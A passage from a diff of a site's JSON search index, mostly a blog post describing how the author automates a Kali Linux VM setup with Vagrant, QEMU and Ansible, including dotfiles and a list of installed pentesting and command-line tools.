yes 3. Dotfiles and Tool Configuration The automation includes configuration for:\nAlacritty terminal emulator Tmux with custom keybindings Doom Emacs with security-focused packages Starship cross-shell prompt Zsh with Oh My Zsh Each tool has its own configuration module in the repository:\nAlacritty Configuration Tmux Configuration Doom Emacs Configuration Starship Configuration Zsh Configuration Included Tools \u0026amp; Features The automation sets up a comprehensive environment with:\nSecurity Tools SecLists (lots of lists) Kerbrute for Kerberos authentication testing Statistically Likely Usernames wordlist Common pentesting tools (I have my folders for linux \u0026amp; windows tools (I will make a repo for that soon)) Bloodhound for Active Directory analysis (dockerized) Development Environment Emacs 29.4 with native compilation Doom Emacs configuration This is my main editor and I use it for everything but if you prefer another editor you can change the Ansible playbook. Git version control Docker and Docker Compose Build tools and development libraries Modern Terminal Experience Alacritty terminal emulator Starship cross-shell prompt Tmuxinator for session management Command Line Improvements Eza (modern ls replacement) Bat (better cat) Ripgrep for searching fd-find for file discovery Enhanced Zsh configuration: zsh-autosuggestions zsh-syntax-highlighting zsh-autocomplete fast-syntax-highlighting Getting Started To use this automation:\nClone the repository:\ngit clone https://github.com/bloodstiller/kaliconfigs.git cd kaliconfigs Install prerequisites:\n# For Debian/Ubuntu sudo apt install qemu-kvm libvirt-daemon-system libvirt-clients vagrant ansible # For Arch Linux sudo pacman -S qemu-full libvirt vagrant ansible Start the VM:\ncd Vagrant/QEMU vagrant up Development Workflow For efficient development and testing:\nRerun only Ansible playbooks:\nvagrant provision Run Ansible directly against the VM:\nvagrant ssh-config \u0026gt; vagrant-ssh-config ansible-playbook -i .vagrant/provisioners/ansible/inventory/vagrant_ansible_inventory Ansible/configure-kali.yml Use snapshots for safe testing:\nvagrant snapshot save baseline vagrant snapshot restore baseline Customization Options The automation is highly customizable:\nVM Resources (Vagrantfile):\nconfig.vm.provider :libvirt do |libvirt| libvirt.memory = 8192 libvirt.cpus = 4 end Package Selection (Ansible):\n​ - name: Install base packages apt: name: ​ - eza ​ - alacritty ​ - git # Add your packages here Shared Folders:\nconfig.vm.synced_folder \u0026#34;/path/to/host\u0026#34;, \u0026#34;/path/in/guest\u0026#34;, type: \u0026#34;virtiofs\u0026#34; Documentation \u0026amp; Resources For detailed setup and configuration instructions, refer to:\nMain Project Documentation - Overview and quick start guide Ansible Configuration Guide - Detailed playbook customization QEMU/KVM Setup Guide - QEMU-specific installation and configuration Alacritty Configuration - Terminal emulator setup Doom Emacs Configuration - Editor configuration Tmux Configuration - Terminal multiplexer setup Starship Configuration - Shell prompt customization Zsh Configuration - Shell configuration and plugins Conclusion Automating Kali VM setup with QEMU and Ansible has significantly improved my workflow. The combination of Vagrant for VM management, QEMU for virtualization, and Ansible for configuration provides a powerful and flexible automation stack.\nThe complete code is available in my kaliconfigs repository . Feel free to fork it and adapt it to your needs.\nHappy hacking!\n", 
         "url": "\/\/uildDrafts:1313\/tools\/automatingqemukalivmansible\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/automation\/": {
-        "title": "Automation",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/automation\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/dotfiles\/": {
-        "title": "Dotfiles",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/dotfiles\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/kali\/": {
-        "title": "Kali",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/kali\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/qemu\/": {
-        "title": "Qemu",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/qemu\/"
     },
     
     "\/\/uildDrafts:1313\/walkthroughs\/redpanda-box\/": {
